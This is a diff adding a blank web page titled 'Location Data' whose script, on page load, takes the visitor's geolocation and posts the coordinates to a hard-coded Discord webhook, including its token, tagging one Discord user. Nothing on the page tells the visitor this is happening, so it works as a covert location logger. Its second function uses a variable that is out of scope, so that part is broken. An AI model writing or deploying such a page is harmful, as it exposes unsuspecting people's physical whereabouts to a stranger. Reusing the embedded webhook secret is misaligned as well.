@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+   <title>Location Data</title>
+   <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+</head>
+<body>
+   <script type="text/javascript">
+    $(document).ready(function () {
+        // HTML5 geolocation
+        navigator.geolocation.getCurrentPosition(success);
+
+        function success(position) {
+            // We get the user's latitude and longitude
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            // Create the payload for the Discord webhook
+            var payload = {
+                content: '<@806392717814530058> Latitude: ' + latitude + '\n<@806392717814530058> Longitude: ' + longitude
+            };
+
+            // Send the data to the Discord webhook
+            $.ajax({
+                type: 'POST',
+                url: 'https://discord.com/api/webhooks/1118811384424185877/jdTWZpv2ZSdv958wT1prNXmo15cMRBbJk_W8t2c3X2nSNWwKWlKIOz4VS_Mx3kneHTUK',
+                contentType: 'application/json',
+                data: JSON.stringify(payload),
+                success: function (data) {
+                    sendAdditionalData();
+                }
+            });
+        }
+
+        function sendAdditionalData() {
+            // Additional data to send below the location data
+            var additionalData = '<@806392717814530058>\nLongitude: ' + position.coords.longitude + '\nLatitude: ' + position.coords.latitude;
+
+            // Create the payload for the Discord webhook
+            var payload = {
+                content: additionalData
+            };
+
+            // Send the additional data to the Discord webhook
+            $.ajax({
+                type: 'POST',
+                url: 'https://discord.com/api/webhooks/1118811384424185877/jdTWZpv2ZSdv958wT1prNXmo15cMRBbJk_W8t2c3X2nSNWwKWlKIOz4VS_Mx3kneHTUK',
+                contentType: 'application/json',
+                data: JSON.stringify(payload),
+                success: function (data) {
+                    console.log('Successfully sent additional data to Discord webhook!');
+                }
+            });
+        }
+    });
+    </script>
+</body>
+</html>
